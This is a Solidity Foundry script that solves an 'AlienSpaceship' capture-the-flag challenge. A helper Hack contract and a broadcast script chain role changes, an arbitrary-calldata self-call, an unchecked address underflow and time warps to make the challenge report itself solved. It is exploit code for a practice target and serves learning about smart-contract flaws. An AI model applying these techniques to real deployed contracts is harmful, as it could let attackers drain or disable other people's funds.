// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Challenge} from "src/Challenge.sol";

import {IAlienSpaceship} from "src/interfaces/IAlienSpaceship.sol";

contract Hack {
    IAlienSpaceship public alienSpaceshipInstance;

    constructor(IAlienSpaceship _alienSpaceshipInstance) payable {
        alienSpaceshipInstance = _alienSpaceshipInstance;
        alienSpaceshipInstance.applyForJob(
            bytes32(alienSpaceshipInstance.ENGINEER())
        );

        alienSpaceshipInstance.dumpPayload(
            alienSpaceshipInstance.payloadMass() - 0x1b1ae4d6e2ef500001
        );

        alienSpaceshipInstance.quitJob();
        alienSpaceshipInstance.applyForJob(
            bytes32(alienSpaceshipInstance.PHYSICIST())
        );
        alienSpaceshipInstance.enableWormholes();
    }

    function abortMission() public {
        alienSpaceshipInstance.applyForPromotion(
            bytes32(alienSpaceshipInstance.CAPTAIN())
        );

        alienSpaceshipInstance.abortMission();
    }
}

contract Solution is Script {
    Challenge public challengeInstance =
        Challenge(payable(0xf902D4C05770Bd4866886114C4bC24Ab6BaB7d75));

    function run() external {
        vm.startBroadcast();
        address ALIENSPACESHIP = address(challengeInstance.ALIENSPACESHIP());
        IAlienSpaceship alienSpaceshipInstance = IAlienSpaceship(
            ALIENSPACESHIP
        );

        console.log("msg.sender: ", msg.sender);
        console.log("ALIENSPACESHIP:", ALIENSPACESHIP);

        alienSpaceshipInstance.applyForJob(
            bytes32(alienSpaceshipInstance.ENGINEER())
        );

        alienSpaceshipInstance.dumpPayload(
            alienSpaceshipInstance.payloadMass() - 0x1b1ae4d6e2ef500001
        );

        bytes memory data = abi.encodeWithSignature(
            "applyForJob(bytes32)",
            alienSpaceshipInstance.ENGINEER()
        );

        alienSpaceshipInstance.runExperiment(data);
        (uint f1, uint f2, bool b1) = alienSpaceshipInstance.roles(
            ALIENSPACESHIP
        );
        console.log("ALIENSPACESHIP", f1, f2, b1);
        alienSpaceshipInstance.quitJob();
        alienSpaceshipInstance.applyForJob(
            bytes32(alienSpaceshipInstance.PHYSICIST())
        );

        alienSpaceshipInstance.enableWormholes();
        vm.warp(block.timestamp + 12);

        alienSpaceshipInstance.applyForPromotion(
            bytes32(alienSpaceshipInstance.CAPTAIN())
        );
        unchecked {
            alienSpaceshipInstance.visitArea51(
                address(51 - uint160(msg.sender))
            );
        }
        console.log(
            alienSpaceshipInstance.jumpThroughWormhole(
                10 ** 23,
                10 ** 23,
                10 ** 23
            )
        );
        console.log("block.timestamp1", block.timestamp);
        alienSpaceshipInstance.quitJob();
        Hack hackInstance = new Hack(alienSpaceshipInstance);
        console.log("Hack", address(hackInstance));

        vm.warp(block.timestamp + 24);
        console.log("block.timestamp2", block.timestamp);
        hackInstance.abortMission();
        console.log("solved?", challengeInstance.isSolved());
        vm.stopBroadcast();
    }
}
